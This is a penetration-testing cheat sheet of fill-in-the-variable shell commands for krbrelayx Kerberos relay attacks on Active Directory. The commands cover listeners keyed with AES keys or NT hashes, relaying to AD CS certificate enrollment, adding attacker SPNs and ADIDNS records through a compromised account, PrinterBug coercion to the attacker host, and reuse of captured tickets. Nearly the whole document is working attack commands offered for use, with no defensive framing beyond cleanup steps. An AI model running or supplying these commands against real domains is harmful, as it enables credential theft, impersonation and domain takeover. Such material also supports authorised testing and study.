# krbrelayx

## krbrelayx listener

### Listener with AES key

Start krbrelayx using an AES key to receive and decrypt incoming Kerberos authentication for a computer account.

```sh title:"Start krbrelayx with AES key"
krbrelayx.py -aesKey "$aes256_key"
```
<!-- cheat
var aes256_key
-->

### Listener with NT hash

Start krbrelayx using an NT hash, commonly for user-account constrained or unconstrained delegation abuse.

```sh title:"Start krbrelayx with NT hash"
krbrelayx.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash"
```
<!-- cheat
var nt_hash
-->

### AD CS relay

Relay Kerberos authentication to AD CS web enrollment.

```sh title:"Relay Kerberos auth to AD CS"
krbrelayx.py --target "http://$ca_fqdn/certsrv" --adcs --template "$template_name" --victim "$victim_fqdn"
```
<!-- cheat
var ca_fqdn
var template_name
var victim_fqdn
-->

## krbrelayx setup

### Add attacker SPN

Add an SPN to a compromised account so Kerberos authentication can be routed to the attacker host.

```sh title:"Add attacker SPN with addspn.py"
addspn.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -s "HOST/$attacker_fqdn" --additional "$dc_fqdn"
```
<!-- cheat
var domain
var compromised_account
var nt_hash
var attacker_fqdn
var dc_fqdn
-->

### Remove attacker SPN

Clean up the added SPN.

```sh title:"Remove attacker SPN with addspn.py"
addspn.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -s "HOST/$attacker_fqdn" --additional "$dc_fqdn" --delete
```
<!-- cheat
var domain
var compromised_account
var nt_hash
var attacker_fqdn
var dc_fqdn
-->

### Add attacker DNS record

Add an ADIDNS record pointing the attacker FQDN to your host.

```sh title:"Add attacker DNS record with dnstool"
dnstool.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -r "$attacker_fqdn" -d "$lhost" --action add "$dc_fqdn"
```
<!-- cheat
import tun_ip
var domain
var compromised_account
var nt_hash
var attacker_fqdn
var dc_fqdn
-->

### Query DNS record

Check the ADIDNS record before or after cleanup.

```sh title:"Query ADIDNS record with dnstool"
dnstool.py -u "$domain/$user" -p "$pass" --record "$attacker_fqdn" --action query "$dc_fqdn"
```
<!-- cheat
var domain
var user
var pass
var attacker_fqdn
var dc_fqdn
-->

## krbrelayx coercion

### PrinterBug to listener

Coerce a target running Print Spooler to authenticate to the attacker FQDN.

```sh title:"Coerce PrinterBug auth to krbrelayx listener"
printerbug.py "$domain/$user:$pass@$target_fqdn" "$attacker_fqdn"
```
<!-- cheat
var domain
var user
var pass
var target_fqdn
var attacker_fqdn
-->

### Export captured ticket

Use a captured ccache with Kerberos-aware tools.

```sh title:"Use captured krbrelayx ccache"
export KRB5CCNAME="$ccache_file"
```
<!-- cheat
var ccache_file
-->
